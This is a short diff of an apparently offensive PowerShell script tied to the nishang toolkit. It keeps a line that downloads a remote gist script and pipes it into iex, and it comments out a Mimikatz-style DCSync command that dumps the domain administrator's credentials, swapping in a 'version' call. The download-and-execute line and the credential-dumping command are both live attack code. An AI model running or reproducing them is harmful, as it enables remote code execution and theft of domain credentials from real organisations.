@@ -40,4 +40,5 @@ $out = 0
 # nishang - 2.2.0 (Jul 24, 2021)
 # Change this to "attacker-ip" for internal sources
 wget('https://gist.githubusercontent.com/pich4ya/144d32262861b573279d15e653c4e08d/raw/6f019c4e2f1f62ffc0754d01dff745d3cec62057/Invoke-SoHighSoHigh.ps1') -UseBasicParsing|iex
-Invoke-SoHighSoHigh -Command '"privilege::debug" "token::elevate" "lsadump::dcsync /domain:tenablead.local /user:administrator"'
+#Invoke-SoHighSoHigh -Command '"privilege::debug" "token::elevate" "lsadump::dcsync /domain:tenablead.local /user:administrator"'
+Invoke-SoHighSoHigh -Command '"version"'
